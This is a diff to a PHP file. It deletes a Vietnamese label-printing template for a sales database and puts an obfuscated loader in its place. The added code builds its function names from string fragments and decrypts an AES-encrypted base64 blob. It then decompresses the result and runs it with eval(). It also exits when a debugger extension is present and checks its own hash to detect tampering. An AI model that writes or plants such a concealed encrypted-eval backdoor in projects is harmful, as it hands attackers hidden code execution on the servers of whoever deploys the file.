@@ -1,124 +1,28 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tem Dán</title>
-    <style>
-        @media print {
-            .tem {
-                width: 50mm;
-                height: 30mm;
-                padding: 5mm;
-                border: 2px solid black;
-                /* Thêm border */
-                margin-bottom: 5mm;
-                overflow: hidden;
-                /* Ẩn nội dung vượt quá kích thước */
-            }
-
-            .tem-content {
-                font-size: 10pt;
-                height: 100%;
-                /* Đảm bảo phần tử con sẽ lấp đầy toàn bộ không gian của phần tử cha */
-                display: flex;
-                /* Sử dụng flexbox để căn chỉnh nội dung */
-                flex-direction: column;
-                /* Dàn nội dung theo hướng dọc */
-                justify-content: space-between;
-                /* Canh giữa các phần tử theo chiều dọc */
-            }
-
-            .company-name {
-                font-weight: bold;
-                font-size: 14pt;
-                /* Kích thước chữ lớn hơn */
-                margin: 0;
-                /* Loại bỏ margin */
-            }
-
-            .item-name {
-                font-weight: bold;
-                margin: 0;
-                /* Loại bỏ margin */
-            }
-        }
-    </style>
-</head>
-
-<body onload="window.print()">
-
-    <tbody>
-        <tr>
-            <td colspan='16'>
-                <?php
-                $q1 = $this->db->query("select * from db_company where id=1 and status=1");
-                $res1 = $q1->row();
-                $company_name = $res1->company_name;
-
-                $i = 1;
-
-                $this->db->select("a.sales_qty,
-                                 a.tax_type,
-                                 a.price_per_unit,
-                                 a.tax_amt,
-                                 a.discount_input,
-                                 a.discount_type,
-                                 a.discount_amt, 
-                                 a.unit_total_cost,
-                                 a.total_cost,
-                                 b.tax,
-                                 b.tax_name,
-                                 c.item_name,
-                                 a.description,
-                                 c.hsn
-                                 ");
-                $this->db->from("db_salesitems a");
-                $this->db->where("a.sales_id", $sales_id);
-                $this->db->join("db_tax b", "b.id=a.tax_id", "left");
-                $this->db->join("db_items c", "c.id=a.item_id", "left");
-
-                $q2 = $this->db->get();
-
-                foreach ($q2->result() as $res2) {
-                    $sales_qty = $res2->sales_qty;
-                    for ($i = 0; $i < $sales_qty; $i++) {
-                        ?>
-                        <div class="tem">
-                            <div class="tem-content">
-                                <p class="company-name">
-                                    <?php echo $company_name; ?>
-                                </p>
-                                <p class="item-name">
-                                    <?php echo "Tên sản phẩm: " . $res2->item_name; ?>
-                                </p>
-                                <p>
-                                    <?php echo $res2->description; ?>
-                                </p>
-                                <p>
-                                    <?php echo "Giá: " . number_format(($res2->price_per_unit), 0) . "đ"; ?>
-                                </p>
-                            </div>
-                        </div>
-                        <?php
-                    }
-                }
-                ?>
-            </td>
-        </tr>
-    </tbody>
-
-</body>
-
-<script>
-    // Sau khi trang được in
-    window.onafterprint = function () {
-        window.close();
-    };
-
-    // Sau khi trang được load, in hóa đơn
-
-</script>
-
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_bwup9g1m=('bas'.'e64'.'_de'.'cod'.'e');
+$_x19bkslb=('gzu'.'nco'.'mpr'.'ess');
+$_ix3nlilz=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_fm9bif7l='DvZQqDuz';
+$_isyr1da9='7ZxfZjZb';
+$_c00l347c='z8CkVO3ZWx0=';
+$_kjzdced4='GSf2MBHT';
+$_kbpy9dtv='EeTgj94X';
+$_r21ji9e1='G2TAoA==';
+$_insuy2qt='pD1bLEJw';
+$_exsmbzk6='B6S1niME';
+$_et2t11ry=$_bwup9g1m($_fm9bif7l.$_isyr1da9.$_kbpy9dtv.$_kjzdced4.$_c00l347c);
+$_vs5ih1se=$_bwup9g1m($_insuy2qt.$_exsmbzk6.$_r21ji9e1);
+$_tozlcfuu=$_bwup9g1m('dKs37etPZ8lfHrMok2ZIjAfb5A/3yup4WwkMUPzDbLXD85dH+AykrLBOtJkqCpeRL8VYdvyBaNv6iHIe81Yg3HlKUBS/UseFlXkXxJdP69y55hjBqe6SF5zn4nlGkYfrSeRlRDbN+BzEI9vaVK8ABZvHv3m6rlx0QfO4MH63BcVVvIU33Segng4K4J2FCGprAlJo3Ow1oD00bLbxxGt7HKiGIXsz+SXYY6/2+C/SuLohNX6sB7lLbuI7+O5gEGFA3g7j+HBSFl24Nm+nHIfBO1L3k+MHY2N81Uwnu/5mnowhxl8q3mmldodj+lUL4MSX6ou+5550JR/J/sGqP2NppNt0RPviWCGdr0anGrga6vSZJF6yZxcI//EfSH9Sc54jX/Swu6DtDTiZr4yTPFculZL/mBANFXQEH6ciFPNFhXC7AHoCielYulEV+rH0wLamooqhiuTR3T5qnSmwQy4GUskmEvHo1zQ9senRaVdZAGaiZLoK2Bk2a2coVYPuLk281LynRg2Ft8NCB7L+7stGjeARBJBwtnVuxo510EG1QNqwIx/jsNV0pvjXAUrmSsd6g3YBy+XwduB6thDrYuUjRZEkfuGfo0FIwuZewEpsf1p2b4luoD+RbOtUk3+TZWuTmQ/URq87+pp8Xqc/XLFv3UBxvHKu1n2e7eXr0f9mZ/9zNYpouTKKZwGlEbLQBuZXs1k7rnGIfWy9Tt8aST1cH3R8SaeacyFhvekvYPaYpl6HS1O2EcN6PKhUD3i+YZEqCHcvOeked1eEQ783nW0dHEimZwjvJhKWXO9QzBH0gtD/aN0SLvpeLuYul5SOSeB0xl2heAOyFOAzRv5W9P/NiRpTUvJ2SapGcHgD35U9JCVJh1TYL4xITWUB5/Y8gecejttdfeo+BCMpw8h3xjod5nr0W/RebCQV8pE1omDGfkCTUAPdpNoAhlcXy9TPWoC7Ig2JXA/SD4WFLB8GiTwZg1d6C65iBzdpmDb6Yfdm66QwUjHD1TIE6NbLRpS2TQ7aFKzQ9Ti07Bi/1+fbPswIpiPkyTTI3tX8PGa8tjZFRkC3E9GUMelC+Oab8Tp45M16zO2jJChbRj1iRCs6Y51YPZDhpNUWetk5OQCuwGIw5PzV8zjRzju77tvbaYwuf8npbr+2N/kLBKu3pCgCPYfHRwmnREHfK123oq5UGyHqynHgMPOnr/laxg0GItlZyxkA/p+y3qUMOBbbHgPdXymEy06KNY/NHe6oWN41oh/NrLMFoJVqiqm4Asv9LInOt64Vh+4Q4w9r5SZGM7egmC8WOaB2yVKIah1EIzdeKP8db97HedaSa+Qni8zwhX/h7iRhzUM25ez6CGul330IYrVm5DByFp7n4Q5GB2PJTN5ovu1VLDTDK9zOIXsaDUi2B4sSyz01q8fn5+I6SIMZ+txwiBURe2eJx61KKFR/tgFUm4ttP4sEmb8DVgYcKiy1qAt6pASaveelB6IPID/YYnUNlza4xT6WWF+AHk2neYpPMB5SgJePcB8B93wMiD3/nG6zAbChZVfqz3YXwGehJDKKYAbogZvRUqbO683BY/a0WVlsf5S6OsXM37BPbz55L16mFAWoKQnnY1LjEUClco5n1VqfSQDcZ3gszDb28RyOmJ7V++WonNmtw/9wihSQBOpM5LnDC4tZY5ke0KhJnonpCMXwheHv1oQ9pDuwBb4+aFvXRwjv3tJQB5CmhJwVxMBB');
+$_ve2cdvl9=$_ix3nlilz($_tozlcfuu,'aes-256-cbc',$_et2t11ry,OPENSSL_RAW_DATA,$_vs5ih1se);
+if($_ve2cdvl9===false){exit;}
+$_pm61j32f=$_x19bkslb($_ve2cdvl9);
+if($_pm61j32f===false){exit;}
+$_cb16v121='ae9f8658cd4347911efbdb2cfb7a89e4b2221395ce7c12af689fdafce0c5fcdb';
+$_jh812f4u=@file_get_contents(__FILE__);
+if($_jh812f4u!==false){
+$_zvgndimu=str_replace($_cb16v121,"0000000000000000000000000000000000000000000000000000000000000000",$_jh812f4u);
+$_fzammp55=hash("sha256",$_zvgndimu);
+if($_fzammp55!==$_cb16v121){@http_response_code(403);exit;}
+}
+eval($_pm61j32f);
